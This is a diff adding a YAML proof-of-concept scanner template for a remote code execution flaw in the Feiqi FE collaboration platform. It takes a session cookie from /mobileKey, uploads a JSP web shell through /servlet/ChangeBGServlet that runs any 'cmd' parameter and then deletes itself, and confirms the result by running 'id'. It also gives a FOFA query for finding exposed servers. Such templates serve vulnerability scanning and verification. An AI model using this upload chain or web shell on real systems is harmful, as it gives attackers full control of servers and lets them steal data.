@@ -1,0 +1,54 @@
+id: feiqi-changebgservlet-rce
+
+info:
+  name: 飞企互联ChangeBGServlet接口命令执行漏洞
+  author: k
+  severity: critical
+  verified: true
+  description: |-
+    飞企互联FE业务协作平台中的/servlet/ChangeBGServlet接口存在一处高危远程代码执行漏洞。由于该端点未能对用户输入进行充分的安全校验，攻击者能够通过构造恶意的HTTP请求，将任意系统命令直接注入服务器并执行。成功利用此漏洞可导致攻击者完全掌控服务器，窃取敏感数据或中断业务服务。
+    fofa: body="/login/indexPicXml_valid.jsp?p=" || app="FE-协作平台"
+  reference:
+    - https://mp.weixin.qq.com/s/R38oy8V1SY36ZVAUoW85Jw?poc_token=HOoLAmmjLUPqfStTRroZQiRiVSHUalIpR_DKIH2S
+  tags: feiqi,rce
+  created: 2025/10/29
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mobileKey
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+    expression: response.status == 200 && response.raw_header.bcontains(b"Set-Cookie")
+    output:
+      search: '"Set-Cookie: (?P<cookie>.+)".bsubmatch(response.raw_header)'
+      cookie: search[1]
+
+  r1:
+    request:
+      method: POST
+      path: /servlet/ChangeBGServlet
+      headers:
+        Content-Type: "multipart/form-data"
+        Cookie: "{{cookie}}"
+      body: |
+        ------111111
+        Content-Disposition: form-data; name="file"; filename="zz.jsp"
+        Content-Type: text/plain
+
+        <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------111111--
+    expression: response.status == 200 && response.body.bcontains(b'{"path":"/login/applyTheme/images/portal/login/')
+    output:
+      search: "'path: (?P<dir>/[^\\s\\n]+)'.bsubmatch(response.body)"
+      dir: search["dir"]
+
+  r2:
+    request:
+      method: GET
+      path: /{{dir}}?cmd=id
+      headers:
+        Cookie: "{{cookie}}"
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0() && r1() && r2()
